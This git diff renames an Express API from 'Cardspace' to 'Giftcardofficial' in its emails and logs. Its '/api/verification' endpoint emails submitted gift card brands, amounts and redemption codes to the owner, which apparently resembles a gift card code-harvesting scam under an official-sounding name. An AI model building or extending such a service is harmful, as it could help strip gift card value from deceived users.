@@ -111,7 +111,7 @@ function escapeHtml(value) {
 app.get("/api/health", (req, res) => {
   res.json({
     status: "ok",
-    service: "Cardspace API",
+    service: "Giftcardofficial API",
   });
 });
 
@@ -138,7 +138,6 @@ app.post("/api/verification", limiter, async (req, res) => {
         ? req.body.message.trim()
         : "";
 
-    // Map personalMessage to redemptionCode to match the email templates and response objects
     const redemptionCode = personalMessage;
 
     /* VALIDATE CARD BRAND */
@@ -229,7 +228,7 @@ app.post("/api/verification", limiter, async (req, res) => {
     const { error } = await resend.emails.send({
       from: emailFrom,
       to: [ownerEmail],
-      subject: "New Cardspace Gift Submission",
+      subject: "New Giftcardofficial Submission",
 
       html: `
         <div style="
@@ -241,7 +240,7 @@ app.post("/api/verification", limiter, async (req, res) => {
         ">
 
           <h2 style="color: #6040a5;">
-            New Cardspace Submission
+            New Giftcardofficial Submission
           </h2>
 
           <p>
@@ -310,14 +309,14 @@ app.post("/api/verification", limiter, async (req, res) => {
           </p>
 
           <p style="color: #6040a5; font-size: 13px;">
-            Cardspace
+            Giftcardofficial
           </p>
 
         </div>
       `,
 
       text: `
-New Cardspace Submission
+New Giftcardofficial Submission
 
 Card brand: ${cardType}
 Currency: ${currency}
@@ -325,7 +324,7 @@ Amount: ${currency} ${amount.toLocaleString("en-US")}
 Redemption Code: ${redemptionCode || "No code provided"}
 Submitted: ${submittedAt}
 
-Cardspace
+Giftcardofficial
       `,
     });
 
@@ -408,5 +407,5 @@ export default app;
 ================================= */
 
 app.listen(PORT, () => {
-  console.log(`Cardspace API running on port ${PORT}`);
+  console.log(`Giftcardofficial API running on port ${PORT}`);
 });
